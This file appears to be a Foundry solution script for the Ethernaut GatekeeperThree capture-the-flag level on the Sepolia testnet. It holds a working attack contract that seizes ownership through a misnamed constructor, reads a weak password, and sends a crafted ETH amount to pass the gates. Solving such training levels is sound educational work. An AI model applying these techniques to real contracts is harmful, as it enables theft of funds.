// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/levels/GatekeeperThree.sol";

/*
    Solution script for the Ethernaut Level 28: GatekeeperThree

    1. Add your priate key to the cast wallet keystore
    2. Replace the instance address used in GatekeeperThreeScript
    3. (Dry) Run the forge script replace sender address with your wallet address
    4. Run the forge script again with the --broadcast flag

    ```
    cast wallet import auditor --interactive

    forge script script/GatekeeperThree.s.sol:GatekeeperThreeScript \
        --rpc-url sepolia \
        --account auditor \
        --sender 0x471cd8eaa5d60c2ed4dd42cc3b0de75ecfbbda62 \
        -vv
    ```

    Results of running this script (with --broadcast) are in this scripts 
    designated broadcast folder: contracts/broadcast/GatekeeperThree.s.sol/11155111
*/

contract GatekeeperThreeAttack {
    GatekeeperThree gatekeeper;

    constructor(address payable target) public payable{
        gatekeeper = GatekeeperThree(target);
    }

    function attack() public {
        // Solve gateOne
        // Sets owner to this contract
        gatekeeper.construct0r(); 

        // Solve gateTwo
        gatekeeper.createTrick();
        // Sets allow_enterance to true
        gatekeeper.getAllowance(block.timestamp); 

        // Solve gateThree
        // Forwards this contract's entire balance to gatekeeper. 
        // For this to correctly pass gate 3 this contracts balance 
        // must be slightly more than  0.001 ETH
        (bool success, ) = payable(address(gatekeeper)).call{
            value: address(this).balance
        }("");
        require(success, "Transfer failed.");

        // Completes the problem
        gatekeeper.enter();
    }
}

contract GatekeeperThreeScript is Script {
    // replace instance with your level1 instance adddress
    address payable instance = payable(0x7F31405a05C15c42832dcA6e29CDA862b54ba2f6);
    GatekeeperThree level28 = GatekeeperThree(instance);

    function run() external {
        vm.startBroadcast();

        // deploy the attack contract sending in 0.001000000000000001 ETH (in order to pass gate 3)
        GatekeeperThreeAttack attack = new GatekeeperThreeAttack{value: 1000000000000001}(instance);
        attack.attack();

        require(level28.entrant() == msg.sender, "the player has not passed the gates");

        vm.stopBroadcast();
    }
}
